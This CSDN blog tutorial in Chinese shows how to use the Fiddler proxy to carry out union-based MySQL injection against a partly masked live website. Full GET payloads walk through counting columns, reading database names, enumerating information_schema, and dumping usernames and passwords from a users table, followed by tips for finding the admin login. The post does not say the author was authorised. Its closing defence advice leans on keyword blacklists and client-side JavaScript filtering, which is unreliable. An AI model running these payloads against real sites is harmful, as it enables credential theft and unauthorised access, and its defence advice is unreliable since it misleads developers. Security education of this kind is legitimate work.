# [渗透&攻防] 四.详解MySQL数据库攻防及Fiddler神器分析数据包 - 杨秀璋的专栏 - CSDN博客





2017年07月30日 01:09:42[Eastmount](https://me.csdn.net/Eastmount)阅读数：2534








这是最近学习渗透和网站攻防的基础性文章，前面文章从数据库原理解读了防止SQL注入、SQLMAP的基础用法、数据库差异备份、Caidao神器。这篇文章将详细讲解MySQL数据库攻防知识，有点类似第一篇文章，然后其核心是解决局部刷新数据的思想，并通过Fiddler神器分析数据包的方法。

希望自己能深入地学习这部分知识，作为一个初学者，在探索网络攻防和渗透的路上还很长。同时，希望文章对你有所帮助，尤其是学习网络安全的初学者，错误或不足之处还请海涵~

    一.Fiddler神器基础用法&局部刷新问题
        1.什么是Fiddler
        2.Fiddler基础用法
        3.局部刷新问题
    二.Fiddler分析MySQL数据库
        1.Fiddler分析界面
        2.数据库如何判断字段总数 order by
        3.数据库获取显示位 union
        4.数据库显示应数据 database()
        5.数据库获取所有数据库名 information_schema
        5.数据库获取表名及列名 table_name
        6.数据库获取登录表字段 columns 
        7.数据库返回用户名和密码 
        8.登录系统
    三.数据库防御措施


前文欣赏：
[[渗透&攻防] 一.从数据库原理学习网络攻防及防止SQL注入](http://blog.csdn.net/eastmount/article/details/75000575)
[[渗透&攻防] 二.SQL MAP工具从零解读数据库及基础用法](http://blog.csdn.net/Eastmount/article/details/75269811)
[[渗透&攻防] 三.数据库之差异备份及Caidao利器](http://blog.csdn.net/eastmount/article/details/75570768)







## 一. Fiddler神器基础用法&局部刷新问题

作者最早接触Fiddler，是身边一个大神，通过Fiddler+C#自制抓取Ipad游戏数据做外挂，让自己的人物总能捡到好装备，十分之崇拜，后悔没跟着他学习下。现在准备好好研究下它吧，希望文章也对你有所帮助。

首先作者简单介绍什么是Fiddler及基础功能，这里引用ohmygirl大神的文章部分内容。
[【HTTP】Fiddler（一） - Fiddler简介](http://blog.csdn.net/ohmygirl/article/details/17846199)
该文章简单易懂，推荐大家阅读。



**1.什么是Fiddler**

Fiddler是位于客户端和服务器端的HTTP代理，也是目前最常用的http抓包工具之一 。 它能够记录客户端和服务器之间的所有 HTTP请求，可以针对特定的HTTP请求，分析请求数据、设置断点、调试web应用、修改请求的数据，甚至可以修改服务器返回的数据，功能非常强大，是web调试的利器。



![](https://img-blog.csdn.net/20170728095830316)

Fiddler是用C#写出来的,它包含一个简单却功能强大的基于JScript .NET 事件脚本子系统，它的灵活性非常棒，可以支持众多的http调试任务，并且能够使用.net框架语言进行扩展。安装前需安装microsoft .net framework可执行文件。






**2.Fiddler基础用法**

运行主界面如下所示：



![](https://img-blog.csdn.net/20170728130031656)



主界面中主要包括四个常用的块： 
(1) Fiddler菜单栏
顶部为菜单栏，包括捕获http请求，停止捕获请求，保存http请求，载入本地session、设置捕获规则等功能。

(2) Fiddler工具栏
菜单栏下来是一行工具栏，包括Fiddler针对当前view的操作（暂停、清除session、decode模式、清除缓存等）。

(3) Web Session面板
左边部分位Web Session面板，主要是Fiddler抓取到的每条http请求（每一条称为一个session），主要包含了请求的url、协议、状态码、body等信息。其中常见状态码为：
    200--成功，服务器成功处理请求且响应已成功接收。
    301--请求的URL
    400--坏请求。当目的服务器接收到请求但不理解细节所以无法处理时发生。
    404--页面找不到。如果目标API已移动或已更新但未保留向后兼容性时发生。
    500--内部服务器错误。服务器端发生了某种致命错误，且错误并被服务提供商捕获。
详细的字段含义如下图所示：



![](https://img-blog.csdn.net/20170729000422672)

(4) 详情和数据统计面板
右边部分位详情和数据统计针对每条http请求的具体统计（例如发送/接受字节数，发送/接收时间，还有粗略统计世界各地访问该服务器所花费的时间）和数据包分析。
其中最常用的是inspector面板，提供了headers、textview、hexview、Raw等多种方式查看单条http请求的请求报文的信息。


![](https://img-blog.csdn.net/20170729001041623)




下面的实例主要应用的就是Inspectors面板下的Raw模块。



**3.局部刷新问题**

在网站开发过程中，局部刷新是常见又实用的功能，局部刷新通过可以调用iframe、ajax等技术实现。下面是我们团队设计的局部刷新界面。



![](https://img-blog.csdn.net/20170729215136106)

再如下图一个局部刷新，点击左边的地图可以在右边显示位置，同时下面出现对应国家的基础信息，但是URL仍然为同一个。


![](https://img-blog.csdn.net/20170729220010080)

如果通过手工注入或SQLMAP是没有反馈结果的，毕竟URL都没有变化。此时你准备怎么解决呢？脑袋是否都想疼了，感谢Na老师和ST老师推荐的Fiddler，下面将结合该工具进行简单叙述，普及它的基础用法。







## 二. Fiddler分析MySQL数据库

**1.Fiddler分析界面**

首先，打开Fiddler后在Web session面板按住Ctrl+A，选中所有界面后点击Delete删除。因为它是实时捕获信息的，先删除该页面。



![](https://img-blog.csdn.net/20170729221357227)

接着在浏览器中输入网址：http://www.xxx.com/worldmap/index
1) Fiddler捕获请求
此时点击其中一个超链接，下面会返回相关信息，此时观察Fiddler，如下图所示，其原理是浏览器点击超链接发送一个请求，Fiddler截获其数据包，200表示成功访问，主机域名和对应URL即对应链接。


![](https://img-blog.csdn.net/20170729222313706)

**2) Inspectors Raw操作**
此时点击Inspectors，右边上下都选择Raw界面，余下部分作者主要使用Inspectors界面的Raw进行操作。上面的Raw是你发出的请求，下面的Raw是你的回复。
点击右部的“Response body is encoded. Click to decode”按钮，其原理是网页传输都是压缩过的，然后你需要解压一下，查找网页的原信息。点击前后对比如下所示：


![](https://img-blog.csdn.net/20170729223602166)![](https://img-blog.csdn.net/20170729223625405)

**3) F12键实时捕获**
此时可以在Fiddler中按F12键，它表示是否实时截获浏览器的数据。按F12后，只需要在Fiddler中操作我们所需界面即可，否则实时操作，请求很多。按F12后右底部显示该图表示实时截获。


![](https://img-blog.csdn.net/20170729222939978)

点击左边Web Session面板的URL，右面显示其对应的请求信息。

**4) URL分析**
对应的URL为：**http://www.xxx.com/worldmap/view/prefix/CN**
反馈的信息为其对应的内容，说明数据库中有类似Area='CN'的语句。现在如果把AF换成AF--呢？首先我们需要解决，怎么在Fiddler中修改URL，并获取返回结果。

**5) Raw下修改URL产生一个新请求**
选中URL并点击键盘快捷键E，可以在Inspectors的Raw界面下修改URL；另一种方法是右键URL，然后选择Replay，Reissue and Edit。然后将URL修改成"CN--"，点击"Run to Completion"按钮产生新的请求，Fiddler会监听浏览器的请求，如果URL访问错误则不会有响应结果，状态码为500等。


![](https://img-blog.csdn.net/20170729225239036)

下面开始结合MySQL数据库知识进行讲解了。



**2.数据库如何判断字段总数 order by**

Inspectors页面Raw进行编辑URL
(1)GEThttp://xxxxx/prefix/**CN')+****order+by+1#**HTTP/1.1(正常显示)
对应的MySQL语句：
select .... from table where area=('cn') order by 1 # and xxxx;
按照1个字段进行排序，正常显示表示该URL对应的SQL语句至少一个字段。

注意：CN后面的 ') 用单引号+括号匹配结束该字符，同时Fiddler加号连接URL，而第一篇文章 "[一.从数据库原理学习网络攻防及防止SQL注入](http://blog.csdn.net/eastmount/article/details/75000575)" URL是空格连接的。最后的#表示在MySQL中注释包括#和--，这里--报错，而#成功访问，如下图所示。



![](https://img-blog.csdn.net/20170729231033087)

(2)GEThttp://xxxxx/prefix/**CN')+****order+by+8#**HTTP/1.1(正常显示)
对应的SQL语句：
select .... from table where area=('cn') order by 8 # and xxxx;
如果出现乱码，则点击右部的“Response body is encoded. Click to decode.”按钮进行查看。

(3)GEThttp://xxxxx/prefix/**CN')+****order+by+9#**HTTP/1.1(错误显示)
对应的SQL语句：
select .... from table where area=('cn') order by 9 # and xxxx;
表示该查询总共8个字段，下面需要开始测试反馈内容。
重点：字段共8个。




**3.数据库获取显示位 union**



在得到字段个数后，需要获取字段位置，则使用union或union all。其中union表示将两个select结果整体显示，并合并相同的结果，union all显示全部结果。例如：



![](https://img-blog.csdn.net/20170712230408730)

(1)GEThttp://xxxxx/prefix/**CN')****+union+select+null,null,null,null,null,null,null,null#**HTTP/1.1
对应的SQL语句：
select .... from table where area=('cn') 
union select null,null,null,null,null,null,null,null  # and xxxx;
正常显示，共8个null，表示通配符，对应8个字段。


![](https://img-blog.csdn.net/20170729232455829)

(2)GEThttp://xxxxx/prefix/**CN')****+union+select+1,2,3,4,5,6,7,8#**HTTP/1.1
对应的SQL语句：
select .... from table where area=('cn') 
union select 1,2,3,4,5,6,7,8  # and xxxx;
此时需要观察反馈的数字，它就是我们获取的那道门，该数字这是进入房间的大门。前面第一篇文章是通过URL测试，如果报错则null替换数字，此时不需要。

(3)GEThttp://xxxxx/prefix/**CNab')****+union+select+1,2,3,4,5,6,7,8#**HTTP/1.1
对应的SQL语句：
select .... from table where area=('CNab') 
union select 1,2,3,4,5,6,7,8  # and xxxx;
然后将"CN"修改成"Cnab"，让其报错不反馈前面的内容，而反馈后面union select 1....8的数字，运行结果如下所示，数字6则为漏洞。
重点：CNab让第一条SQL语句不返回，只关注我们的信息。


![](https://img-blog.csdn.net/20170729233640181)

接下来想办法将我们需要的结果在这里显示即可，数据都是从后台数据库中查询出来的。


**4.数据库显示应数据 database()**

(1)GEThttp://xxxxx/prefix/**CN')****+union+select+1,2,3,4,5,database(),7,8#**HTTP/1.1
对应的SQL语句：
select .... from table where area=('cn') 
union select 1,2,3,4,5,database(),7,8  # and xxxx;
MySQL数据库中database()用于获取数据库的内容，version()用于获取当前数据库版本号内容。如下当前数据库为20170720df。



![](https://img-blog.csdn.net/20170729234106096)




查询的结果如下所示，数据库为mfa。



![](https://img-blog.csdn.net/20170729234437101)

如果想连接，则使用concat()拼接函数：
(2) union+select+1,2,3,4,5,**concat(user(),0x20,database(),0x20,version())**,7,8#
反馈结果，0x20表示空格：
**mfaroot@localhost mfa 5.5.4-deb8u1-log**
<div class="line-block"></div>
<div class="line-block"></div>

**5.获取当前所有数据库 information_schema**


那么怎么获取数据库所有的数据库名呢？
作者最早想到的是SQL语句：
select table_name from information_schema.tables;
该语句反馈整个数据库系统中，所有的表名，如下所示：




![](https://img-blog.csdn.net/20170729235922178)



但是下面的链接反馈500错误：
http://xxxxx/prefix/CNab')+union+all+select+1,2,3,4,5,
(select+table_name+from+information_schema.tables),7,8#
这是因为需要将数据库反馈结果拼接成一行，同时还需要指定只获取mfa数据库里面的表，则使用如下方法：

```
mysql安装成功后可以看到已经存在mysql、information_schema和test这个几个数据库
information_schema库中有一个名为COLUMNS的表，这个表中记录了数据库中所有表的字段信息。
知道这个表后，获取任意表的字段就只需要一条select语句即可。如：

select COLUMN_NAME from information_schema.COLUMNS where table_name = 'your_table_name';
```

(1)GEThttp://xxxxx/prefix/**CN****')+union+all+select+1,2,3,4,5,    group_concat(distinct+table_schema),7,8+from+    information_schema.columns#**HTTP/1.1
对应的SQL语句：
select .... from table where area=('cn') 
union all select 1,2,3,4,5,group_concat(distinct+table_schema),7,8
from information_schema.columns# and xxxx;
Fiddleer输出结果如下所示：
information_schema,mfa
<div class="line-block"></div>
<div class="line-block"></div>

(2)GET http://xxxxx/worldmap/view/prefix/**CNab')+union+all+    select+1,2,3,4,5,group_concat(distinct+table_schema),7,8+from+    information_schema.columns+where+table_schema=database()#**HTTP/1.1
对应的SQL语句：
select group_concat(distinct+table_schema) from 
information_schema.columns where table_schema=database();
本地数据库测试如下图所示：

![](https://img-blog.csdn.net/20170730001009114)



Fiddler输出结果如下所示，同理获取表名。
mfa
<div class="line-block"></div>
<div class="line-block"></div>


**6.数据库获取表名及列名 table_name**

(1)GET http://xxxxx/worldmap/view/prefix/**CNab')+union+all+    select+1,2,3,4,5,group_concat(distinct+table_name),7,8+from+    information_schema.tables+where+table_schema=database()#**HTTP/1.1
对应的MySQL语句，table_name、tables表示表名：
select group_concat(distinct+table_name) from 
information_schema.tables where table_schema=database();
本地数据库测试如下图所示，输出结果包括该各个表名。



![](https://img-blog.csdn.net/20170730001547427)


输出结果如下所示：


![](https://img-blog.csdn.net/20170730001921143)

问题，但是我并没有找到登录表，原来group_concat有限制，那怎么处理呢？使用limit m,n进行限制，从m开始输出n个字段。平时常使用的是limit n输出前n个字段。
select table_name from information_schema.tables 
where table_schema=database() limit 10,5;
本地数据库从10序号开始输出5个字段，如下所示：


![](https://img-blog.csdn.net/20170730002729481)

依次从0开始输出20个字段，并count()统计总共多少张表，总会找到登陆表。

(2)GET http://xxxxx/worldmap/view/prefix/**CNab')+union+all+    select+1,2,3,4,5,group_concat(distinct+table_name),7,8+from+    (select+table_name+from+information_schema.tables+    where+table_schema=database()+limit+0,20)+as+sub# **HTTP/1.1
对应的MySQL语句如下，使用子查询获取20个表名，再进行拼接输出：
select group_concat(distinct+table_name) from 
(select table_name from information_schema.tables
 where table_schema=database() limit 0,20) as sub;
输出结果如下：


![](https://img-blog.csdn.net/20170730003636422)

(3)GET http://xxxxx/worldmap/view/prefix/**CNab')+union+all+    select+1,2,3,4,5,group_concat(distinct+table_name),7,8+from+    (select+table_name+from+information_schema.tables+    where+table_schema=database()+limit+100,20)+as+sub# **HTTP/1.1 
依次从limit 20,20、limit 40,20、limit 100,20进行获取，最好发现登录表为users。


重点：登陆表users




**7.数据库获取登录表字段 columns**

获取登录表的字段，使用SQL语句：
select group_concat(distinct+column_name) from 
information_schema.columns where table_name='users';
本地数据库运行结果如下所示：



![](https://img-blog.csdn.net/20170730004117651)

(1)GET http://xxxxx/worldmap/view/prefix/**CNab')+union+all+    select+1,2,3,4,5,group_concat(distinct+column_name),7,8+from+    information_schema.columns+where+table_name='users'#**HTTP/1.1
对应的MySQL语句，table_name、tables表示表名：
select 1,2,3,4,5,group_concat(distinct+tcolumn_name),7,8 from 
information_schema.columns where table_name='users';
输出结果如下图所示：


![](https://img-blog.csdn.net/20170730004631361)

重点：用户名字段username、密码password。



**8.数据库返回用户名和密码 **

(1)GET http://xxxxx/worldmap/view/prefix/CNab')+union+all+
    select+1,2,3,4,5,group_concat(distinct+**username,**0x2b**,******
    password,0x2b,vozrast),7,8+from+users#HTTP/1.1
对应的MySQL语句，table_name、tables表示表名：
select group_concat(distinct+username,0x2b,password,0x2b,vozrast) from users;
点击"Run to completion"按钮输出结果如下图所示，0x2b表示加号，如果获取更多用户名和密码，你可以自己思考下？



![](https://img-blog.csdn.net/20170730005208790)




**9.登录系统**


登录怎么找到登录页面呢？照网站后台的方法：
方法一：一定用谷歌搜索，admin、login、system、manage、user等关键词；
方法二：配置文件robots.txt，网页链接等；
方法三：扫描目录，通过一些工具。



![](https://img-blog.csdn.net/20170730005737419)

然后登录即可。





## 三. 数据库防御措施

真正的困难在于如何找到一个存在漏洞的网站，如何去防护。现在很多网站都应做好相关防御措施，手工SQL注入是没有反应的，但是找到漏洞后，再利用SQLMAP就能够找到相应的用户名和密码。



参考前文，个人理解的防御措施：

    1.在URL设置不允许非法字符，如单引号、等号、注释--、减号，提示非法参数；
    2.在URL设置不允许SQL常见的关键词，如and、select、or、insert等；
    3.传递的id=115参数必须为数字才能正常跳转，否则跳转错误；
    4.服务器启用SQL注入拦截功能，提示当前网页的 URL / POST / COOKIES中包含了特定的 SQL字符而被防火墙拦截，因为可能通过POST、Cookies进行攻击，各方面都需要做到防御。
    5.可以使用[js](http://lib.csdn.net/base/javascript)在客户端进行不安全字符屏蔽，也可以在jsp中调用该函数检查是否包函非法字符，或使用正则表达式过滤传入的参数，防止SQL从URL注入。

希望文章对你有所帮助，尤其是网络安全的程序员，因为系列文章是和前文息息相关的，所以看着有些凌乱。如果文章存在错误或不足之处，还请海涵。感谢娜师傅的一路陪伴，学中文的扔掉了手中的尤克里里，教我写代码也是很疯狂的啊，哈哈！不忘初心，继续前行。加油，秀璋。绿妖，晚安！
(By:Eastmount 2017-07-30 深夜1点  [http://blog.csdn.net/eastmount/](http://blog.csdn.net/eastmount/) )










